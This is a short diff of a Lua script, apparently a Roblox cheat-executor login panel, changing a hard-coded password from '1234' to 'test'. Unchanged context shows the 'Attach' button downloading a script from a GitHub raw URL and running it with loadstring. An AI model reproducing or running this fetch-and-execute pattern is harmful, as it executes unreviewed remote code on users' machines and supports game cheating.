@@ -158,7 +158,7 @@ X.MouseButton1Down:connect(function()
 end)
 
 Attach.MouseButton1Down:connect(function()
-    if password.Text == "1234" then
+    if password.Text == "test" then
         login.Enabled = false
         loadstring(game:HttpGet("https://raw.githubusercontent.com/Skiboot007/-e-/main/(e).lua"))()
     end
